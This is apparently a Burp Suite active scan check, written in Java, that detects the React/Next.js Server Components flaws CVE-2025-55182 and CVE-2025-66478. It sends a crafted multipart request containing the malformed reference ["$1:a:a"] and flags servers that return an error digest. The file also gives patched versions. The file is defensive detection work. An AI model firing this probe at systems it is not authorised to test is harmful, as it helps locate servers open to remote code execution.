id: c574e9b7-faa6-4a29-957b-27718299217f
name: "CVE-2025-55182, CVE-2025-66478 - React2Shell"
function: SCAN_CHECK_ACTIVE_PER_HOST
location: SCANNER
source: "/**\r\n * Active scan check for CVE-2025-55182 (React) and CVE-2025-66478\
  \ (Next.js).\r\n *\r\n * The vulnerability exploits insecure deserialization in\
  \ the RSC Flight protocol\r\n * where unvalidated colon-delimited property references\
  \ cause server crashes\r\n * that can lead to RCE (CVSS 10.0).\n *\n * @author Dave\
  \ Paterson, PortSwigger\n */\nString boundary = \"----WebKitFormBoundary\" + UUID.randomUUID().toString().replace(\"\
  -\", \"\").substring(0, 16);\r\n\r\nString payload = \"--\" + boundary + \"\\r\\\
  n\" +\r\n                 \"Content-Disposition: form-data; name=\\\"1\\\"\\r\\\
  n\\r\\n\" +\r\n                 \"{}\\r\\n\" +\r\n                 \"--\" + boundary\
  \ + \"\\r\\n\" +\r\n                 \"Content-Disposition: form-data; name=\\\"\
  0\\\"\\r\\n\\r\\n\" +\r\n                 \"[\\\"$1:a:a\\\"]\\r\\n\" +\r\n     \
  \            \"--\" + boundary + \"--\\r\\n\";\r\n\r\nString request =\r\n     \
  \   \"\"\"\r\n        POST / HTTP/1.1\\r\r\n        Host: %s\\r\r\n        Content-Type:\
  \ multipart/form-data; boundary=%s\\r\r\n        Next-Action: %s\\r\r\n        X-Nextjs-Request-Id:\
  \ %s\\r\r\n        Next-Router-State-Tree: [[[\"\",{\"children\":[\"__PAGE__\",{}]},null,null,true]]\\\
  r\r\n        \\r\r\n        \"\"\".formatted(\r\n                requestResponse.request().httpService().host(),\r\
  \n                boundary,\r\n                UUID.randomUUID().toString().replace(\"\
  -\", \"\"),\r\n                UUID.randomUUID().toString()\r\n        );\r\nHttpRequestResponse\
  \ exploitResponse = http.sendRequest(HttpRequest.httpRequest(requestResponse.httpService(),\
  \ request).withBody(payload));\r\n\r\nif (exploitResponse != null\r\n    && exploitResponse.hasResponse()\r\
  \n    && exploitResponse.response().statusCode() == 500\r\n)\r\n{\r\n    String\
  \ body = exploitResponse.response().bodyToString();\r\n    if (body == null)\r\n\
  \    {\r\n        return AuditResult.auditResult();\r\n    }\r\n\r\n    if (body.contains(\"\
  E{\\\"digest\\\"\") ||\r\n        (body.contains(\"digest\") && body.contains(\"\
  Error\")))\r\n    {\r\n        AuditIssue auditIssue = AuditIssue.auditIssue(\r\n\
  \                \"CVE-2025-55182 / CVE-2025-66478 React Server Components Remote\
  \ Code Execution\",\r\n                \"\"\"\r\n                        <p>The\
  \ application is vulnerable to <b>CVE-2025-55182</b> (React) and <b>CVE-2025-66478</b>\
  \ (Next.js), \\\r\n                        critical Remote Code Execution vulnerabilities\
  \ in React Server Components with CVSS score of 10.0.</p>\\\r\n                \
  \        <p><b>Vulnerability Overview:</b></p>\\\r\n                        <ul>\\\
  \r\n                        <li>Unauthenticated Remote Code Execution via insecure\
  \ deserialization</li>\\\r\n                        <li>The RSC Flight protocol\
  \ fails to validate property existence in colon-delimited references</li>\\\r\n\
  \                        <li>Malformed multipart form-data triggers unhandled exceptions\
  \ leading to RCE</li>\\\r\n                        <li>No prerequisites or special\
  \ configuration required for exploitation</li>\\\r\n                        </ul>\\\
  \r\n                        <p><b>Detection Evidence:</b></p>\\\r\n            \
  \            <ul>\\\r\n                        <li>✓ HTTP 500 status code received</li>\\\
  \r\n                        <li>✓ Next.js error digest pattern detected in response</li>\\\
  \r\n                        <li>✓ Server failed to handle malicious property reference:\
  \ <code>[\"$1:a:a\"]</code></li>\\\r\n                        </ul>\\\r\n      \
  \                  \"\"\",\r\n                \"\"\"\r\n                       \
  \ <p><b>CRITICAL - Immediate Action Required</b></p>\\\r\n                     \
  \   <p>This vulnerability allows unauthenticated attackers to execute arbitrary\
  \ code on the server. \\\r\n                        Patch immediately.</p>\\\r\n\
  \                        <p><b>Upgrade to Patched Versions:</b></p>\\\r\n      \
  \                  <ul>\\\r\n                        <li><b>React:</b> 19.0.1, 19.1.2,\
  \ or 19.2.1</li>\\\r\n                        <li><b>Next.js:</b> 15.0.5, 15.1.9,\
  \ 15.2.6, 15.3.6, 15.4.8, 15.5.7, or 16.0.7</li>\\\r\n                        </ul>\\\
  \r\n                        <p><b>Remediation Steps:</b></p>\\\r\n             \
  \           <ol>\\\r\n                        <li>Update package.json dependencies\
  \ to patched versions</li>\\\r\n                        <li>Run: <code>npm install</code>\
  \ or <code>npm update</code></li>\\\r\n                        <li>Rebuild and redeploy\
  \ application</li>\\\r\n                        <li>Verify fix by re-scanning</li>\\\
  \r\n                        </ol>\\\r\n                        <p><b>References:</b></p>\\\
  \r\n                        <ul>\\\r\n                        <li><a href=\"https://nextjs.org/blog/CVE-2025-66478\"\
  >Next.js Security Advisory</a></li>\\\r\n                        <li><a href=\"\
  https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182\">CVE-2025-55182\
  \ Details</a></li>\\\r\n                        <li><a href=\"https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478/\"\
  >Detection of CVE-2025-55182</li>\\\r\n                        </ul>\"\"\",\r\n\
  \                requestResponse.request().url(),\r\n                AuditIssueSeverity.HIGH,\r\
  \n                AuditIssueConfidence.CERTAIN,\r\n                null,\r\n   \
  \             null,\r\n                AuditIssueSeverity.HIGH,\r\n            \
  \    exploitResponse\r\n        );\r\n        return AuditResult.auditResult(List.of(auditIssue));\r\
  \n    }\r\n}\r\n\r\nreturn AuditResult.auditResult();"
